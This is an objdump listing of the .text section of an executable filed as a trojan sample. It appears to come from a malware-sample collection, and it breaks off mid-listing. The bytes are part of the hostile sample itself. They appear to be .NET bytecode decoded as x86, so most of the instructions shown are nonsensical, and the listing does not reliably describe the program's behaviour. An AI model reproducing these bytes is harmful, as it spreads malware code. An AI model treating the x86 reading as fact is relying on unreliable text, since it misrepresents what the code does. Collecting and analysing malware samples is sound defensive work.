
malware_samples/trojan/79b3c55f6a26b8b3c0989e732c497645d10f6a820297af1c55c550695d898481.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	50                   	push   %eax
  402001:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f4 59 00       	add    $0x59f400,%eax
  402013:	00 2c 6d 00 00 03 00 	add    %ch,0x30000(,%ebp,2)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	c6                   	(bad)
  4021d0:	25 00 70 7e 10       	and    $0x107e7000,%eax
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 28                	add    $0x28,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 7a 21 00       	and    $0x217a72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 72                	jb     0x402268
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 7a 21 00       	and    $0x217a72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 84                	jb     0x4021aa
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 84 26 00       	and    $0x268472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 74             	add    %dh,0x74(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
